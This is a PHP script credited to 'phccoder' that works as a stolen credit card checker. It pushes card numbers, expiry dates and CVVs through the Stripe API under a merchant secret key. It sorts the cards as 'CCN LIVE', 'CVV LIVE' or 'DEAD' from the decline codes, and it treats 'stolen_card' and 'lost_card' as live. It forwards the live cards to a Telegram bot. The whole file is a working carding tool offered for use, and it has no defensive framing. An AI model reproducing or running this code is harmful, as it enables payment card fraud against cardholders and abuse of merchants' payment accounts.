<?php
//Script Author: phccoder https://t.me/PHCC0D3r

/*===[PHP Setup]==============================================*/
error_reporting(0);
ini_set('display_errors', 0);

/*===[Include Setup]==========================================*/
include 'preset.php';

/*===[HTTP Processes]=========================================*/
/* 1st Request */
$resp1 = http_request('https://api.stripe.com/v1/sources', 'POST', 'type=card&owner[name]='.$name_full.'&owner[email]='.$email.'&owner[address][line1]='.$location_street.'&owner[address][city]='.$location_city.'&owner[address][state]='.$location_state.'&owner[address][postal_code]='.$location_postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&card[cvc]='.$cvv, $sk . ':');
$result1 = $resp1['body'];
if ($resp1['errno'] || $result1 === false) {
    phc_log('stripe3', '1st request failed errno='.$resp1['errno'].' http='.$resp1['code']);
}

/* 1st Request Results */
$res1 = json_decode($result1, 1);
$src = $res1['id'];

if (isset($src)) {
    /* 2nd Request */
    $resp2 = http_request('https://api.stripe.com/v1/customers', 'POST', 'description=phccoder&source='.$src.'&address[line1]='.$location_street.'&address[city]='.$location_city.'&address[state]='.$location_state.'&address[postal_code]='.$location_postcode.'&address[country]=US', $sk . ':');
    $result2 = $resp2['body'];
    if ($resp2['errno'] || $result2 === false) {
        phc_log('stripe3', '2nd request failed errno='.$resp2['errno'].' http='.$resp2['code']);
    }

    /* 2nd Request Results */
    $res2 = json_decode($result2, 1);
    $cus = $res2['id'];

}

if (isset($res2['id'])&&!isset($res2['sources'])) {
    /* 3rd Request */
    $resp3 = http_request("https://api.stripe.com/v1/customers/$cus/sources/$src", 'GET', null, $sk . ':');
    $curl3 = $resp3['body'];
    if ($resp3['errno'] || $curl3 === false) {
        phc_log('stripe3', '3rd request failed errno='.$resp3['errno'].' http='.$resp3['code']);
    }

    /* 3rd Request Response */
    $res3 = json_decode($curl3, true);

}

/*===[cURL Response Setup]====================================*/
if (isset($res1['error'])) {
    //DEAD
    $code = $res1['error']['code'];
    $decline_code = $res1['error']['decline_code'];
    $message = $res1['error']['message'];

    if(isset($res1['error']['decline_code'])){
        $codex = $decline_code;
    }else{
        $codex = $code;
    }
    $err = ''.$res1['error']['message'].' '.$codex;
    
    if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
        //CCN LIVE
        if(isset($telebot) && $telebot != ""){
            if($tele_msg == "2"|| $tele_msg == "3") {
                BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
            }
        }
        EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
    }elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
        //CVV LIVE: Insufficient Funds
        if(isset($telebot) && $telebot != ""){
            if($tele_msg == "1"|| $tele_msg == "3") {
                BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match [Insuf. Balance]%0A",$telebot);
            }
        }
        EchoMessage('CVV LIVE',$cc_info.' >> '.$err);
    }elseif($code == "stolen_card"||$decline_code == "stolen_card"){
        //CCN LIVE: Lost Card
        if(isset($telebot) && $telebot != ""){
            if($tele_msg == "2"|| $tele_msg == "3") {
                BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Lost Card]%0A",$telebot);
            }
        }
        EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
    }elseif($code == "lost_card"||$decline_code == "lost_card"){
        //CCN LIVE: Stolen Card
        if(isset($telebot) && $telebot != ""){
            if($tele_msg == "2"|| $tele_msg == "3") {
                BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
            }
        }
        EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
    }elseif($code == "testmode_charges_only"||$decline_code == "testmode_charges_only"){
        //TESTMODE CHARGES
        EchoMessage('DEAD',$cc_info.' >> SK Error: Test mode only - account cannot make live charges (see CHECK SK) ');
    }elseif(strpos($result1, 'Sending credit card numbers directly to the Stripe API is generally unsafe.')) {
        //INTEGRATION ON
        EchoMessage('DEAD',$cc_info.' >> SK Error: Integration');
    }elseif(strpos($result1, "You must verify a phone number on your Stripe account before you can send raw credit card numbers to the Stripe API.")){
        //VERIFY NUMBER
        EchoMessage('DEAD',$cc_info.' >> SK Error: Verify Phone Number');
    }else{
        //DEAD
        EchoMessage('DEAD',$cc_info.' >> '.$err);
    }
}else{
    if (isset($res2['error'])) {
        //DEAD
        $code = $res2['error']['code'];
        $decline_code = $res2['error']['decline_code'];
        $message = $res2['error']['message'];
        if(isset($res2['error']['decline_code'])){
            $codex = $decline_code;
        }else{
            $codex = $code;
        }
        $err = ''.$res2['error']['message'].' '.$codex;

        if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
            //CCN LIVE
            if(isset($telebot) && $telebot != ""){
                if($tele_msg == "2"|| $tele_msg == "3") {
                    BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
                }
            }
            EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
        }elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
            //CVV LIVE: Insufficient Funds
            if(isset($telebot) && $telebot != ""){
                if($tele_msg == "1"|| $tele_msg == "3") {
                    BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match [Insuf. Balance]%0A",$telebot);
                }
            }
            EchoMessage('CVV LIVE',$cc_info.' >> '.$err);
        }elseif($code == "stolen_card"||$decline_code == "stolen_card"){
            //CCN LIVE: Stolen Card
            if(isset($telebot) && $telebot != ""){
                if($tele_msg == "2"|| $tele_msg == "3") {
                    BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
                }
            }
            EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
        }elseif($code == "lost_card"||$decline_code == "lost_card"){
            //CCN LIVE: Lost Card
            if(isset($telebot) && $telebot != ""){
                if($tele_msg == "2"|| $tele_msg == "3") {
                    BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Lost Card]%0A",$telebot);
                }
            }
            EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
        }else{
            //DEAD
            EchoMessage('DEAD',$cc_info.' >> '.$err);
        }
    }else{
        if (isset($res2['sources'])) {
            $cvc_res2 = $res2['sources']['data'][0]['card']['cvc_check'];
            if($cvc_res2 == "pass"||$cvc_res2 == "success"){
                //CVV MATCH CONGRATS
                if(isset($telebot) && $telebot != ""){
                    if($tele_msg == "1"|| $tele_msg == "3") {
                        BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
                    }
                }
                EchoMessage('CVV LIVE',$cc_info.' >> cvc_check : '.$cvc_res2);
            }else{
                //DEAD
                EchoMessage('DEAD',$cc_info.' >> cvc_check : '.$cvc_res2);
            }
        }else{
            $cvc_res3 = $res3['card']['cvc_check'];
            if($cvc_res3 == "pass"||$cvc_res3 == "success"){
                //CVV MATCH CONGRATS
                if(isset($telebot) && $telebot != ""){
                    if($tele_msg == "1"|| $tele_msg == "3") {
                        BotForwarder("<b>phccoder Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
                    }
                }
                EchoMessage('CVV LIVE',$cc_info.' >> cvc_check : '.$cvc_res3);
            }else{
                //DEAD
                EchoMessage('DEAD',$cc_info.' >> cvc_check : '.$cvc_res3);
            }
        }
    }
}

if ($testMode) {
    echo '<pre>';
    echo "1st cURL <br>";
    echo json_encode($res1, JSON_PRETTY_PRINT);
    if (isset($src)) {
        echo "<br><br>2nd cURL <br>";
        echo json_encode($res2, JSON_PRETTY_PRINT);
    }
    if (isset($res2['id'])&&!isset($res2['sources'])) {
        echo "<br><br>3rd cURL <br>";
        echo json_encode($res3, JSON_PRETTY_PRINT);
    }
}

?>